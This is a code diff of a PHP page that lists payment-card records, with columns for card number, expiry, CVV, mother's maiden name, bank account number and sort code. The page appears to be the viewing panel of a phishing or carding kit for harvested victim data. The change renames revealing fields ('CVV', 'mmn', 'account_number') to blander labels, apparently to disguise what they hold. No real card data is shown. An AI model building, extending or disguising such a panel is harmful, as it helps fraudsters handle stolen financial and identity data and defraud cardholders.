@@ -208,7 +208,7 @@ table button {
                     <!-- Column checkboxes -->
                     <label><input type="checkbox" value="0" checked> Card Number</label><br>
                     <label><input type="checkbox" value="1" checked> Expiration</label><br>
-                    <label><input type="checkbox" value="2" checked> CVV</label><br>
+                    <label><input type="checkbox" value="2" checked> verification_code</label><br>
                     <label><input type="checkbox" value="3" checked> Name on Card</label><br>
                     <label><input type="checkbox" value="4" checked> Address</label><br>
                     <label><input type="checkbox" value="5" checked> City</label><br>
@@ -242,7 +242,7 @@ table button {
                     <tr style="background-color: #f4f4f4; border-bottom: 2px solid #ddd;">
                         <th style="padding: 10px; border: 1px solid #ddd; width: 18%;">Card Number</th>
                         <th style="padding: 10px; border: 1px solid #ddd;">Expiration</th>
-                        <th style="padding: 10px; border: 1px solid #ddd;">CVV</th>
+                        <th style="padding: 10px; border: 1px solid #ddd;">verification_code</th>
                         <th style="padding: 10px; border: 1px solid #ddd;">Name on Card</th>
                         <th style="padding: 10px; border: 1px solid #ddd;">Address</th>
                         <th style="padding: 10px; border: 1px solid #ddd;">City</th>
@@ -275,13 +275,13 @@ table button {
 
                         </td>
                         <td style="padding: 10px;">
-                            <?php echo htmlspecialchars($card['ex_mm'] . '/' . $card['yyyy_exp']) ?></td>
-                        <td style="padding: 10px;"><?php echo htmlspecialchars($card['cvv']) ?></td>
-                        <td style="padding: 10px;"><?php echo htmlspecialchars($card['name_on_card']) ?></td>
+                            <?php echo htmlspecialchars($card['ex_mm'] . '/' . $card['ex_yy']) ?></td>
+                        <td style="padding: 10px;"><?php echo htmlspecialchars($card['verification_code']) ?></td>
+                        <td style="padding: 10px;"><?php echo htmlspecialchars($card['billing_name']) ?></td>
                         <td style="padding: 10px;"><?php echo htmlspecialchars($card['address']) ?></td>
                         <td style="padding: 10px;"><?php echo htmlspecialchars($card['city']) ?></td>
-                        <td style="padding: 10px;"><?php echo htmlspecialchars($card['mmn']) ?></td>
-                        <td style="padding: 10px;"><?php echo htmlspecialchars($card['account_number']); ?></td>
+                        <td style="padding: 10px;"><?php echo htmlspecialchars($card['security_hint']) ?></td>
+                        <td style="padding: 10px;"><?php echo htmlspecialchars($card['account_ref']); ?></td>
                         <td style="padding: 10px;"><?php echo htmlspecialchars($card['sort_code']) ?></td>
 
                         <td style="padding: 10px;"><?php echo htmlspecialchars($card['zip']) ?></td>
